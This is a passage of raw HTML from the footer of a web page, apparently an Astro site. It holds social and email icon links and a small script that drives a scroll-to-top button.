href="#ai:lucide:twitter"></use>  </svg>  </a> </li><li> <a href="mailto:zoverin@proton.me" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Email" title="Email">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:mail">   <symbol id="ai:lucide:mail" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect width="20" height="16" x="2" y="4" rx="2"/></g></symbol><use href="#ai:lucide:mail"></use>  </svg>  </a> </li> </ul> </footer> </body></html> <script type="module">document.addEventListener("astro:page-load",()=>{const o=document.getElementById("scroll-to-top"),t=document.querySelector("footer");o&&t&&(o.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("scroll",()=>{const e=t.getBoundingClientRect().top<=window.innerHeight;o.classList.toggle("hidden",window.scrollY<=300||e)}))});</script>